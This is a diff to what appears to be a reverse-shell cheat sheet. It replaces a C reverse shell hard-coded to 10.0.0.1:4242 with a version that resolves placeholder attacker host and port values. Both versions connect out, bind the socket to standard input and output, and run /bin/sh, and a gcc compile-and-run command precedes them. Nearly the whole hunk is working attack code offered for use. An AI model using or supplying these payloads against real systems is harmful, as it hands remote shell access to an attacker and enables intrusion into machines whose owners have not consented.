@@ -386,34 +386,56 @@ Thread.start {
 
 Compile with `gcc /tmp/shell.c --output csh && csh`
 
-```csharp
+```c
 #include <stdio.h>
-#include <sys/socket.h>
-#include <sys/types.h>
+#include <string.h>
 #include <stdlib.h>
 #include <unistd.h>
-#include <netinet/in.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netdb.h>
 #include <arpa/inet.h>
 
 int main(void){
-    int port = 4242;
-    struct sockaddr_in revsockaddr;
+    const char *RHOST = strdup("RHOST");  /* attacker's IP/domain */
+    const char *RPORT = strdup("RPORT");  /* attacker's port      */
+    int sockfd;
 
-    int sockt = socket(AF_INET, SOCK_STREAM, 0);
-    revsockaddr.sin_family = AF_INET;       
-    revsockaddr.sin_port = htons(port);
-    revsockaddr.sin_addr.s_addr = inet_addr("10.0.0.1");
+    /* hints for getaddrinfo() */
+    struct addrinfo hints;
+    /* to store the results from getaddrinfo() */
+    struct addrinfo *remote_addr;
+    /* to loop over the linked list of remote_addr */
+    struct addrinfo *p;
 
-    connect(sockt, (struct sockaddr *) &revsockaddr, 
-    sizeof(revsockaddr));
-    dup2(sockt, 0);
-    dup2(sockt, 1);
-    dup2(sockt, 2);
+    memset(&hints, '\0', sizeof(hints));
+    hints.ai_family = AF_UNSPEC; /* can be IPv4 or IPv6 */
+    hints.ai_socktype = SOCK_STREAM;
 
-    char * const argv[] = {"/bin/sh", NULL};
+    getaddrinfo(RHOST, RPORT, &hints, &remote_addr);
+
+    /* loop over the addresses returned by getaddrinfo() as the first one may
+     * not always work
+     */
+    for (p = remote_addr; p != NULL; p = p->ai_next) {
+        if ( (sockfd = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1)
+            continue;
+
+        if ( connect(sockfd, p->ai_addr, p->ai_addrlen) == -1) {
+            close(sockfd);
+            continue;
+        }
+        break;
+    }
+
+    dup2(sockfd, 0);
+    dup2(sockfd, 1);
+    dup2(sockfd, 2);
+
+    char *argv[2] = {"/bin/sh", NULL};
     execve("/bin/sh", argv, NULL);
 
-    return 0;       
+    return 0;
 }
 ```
 
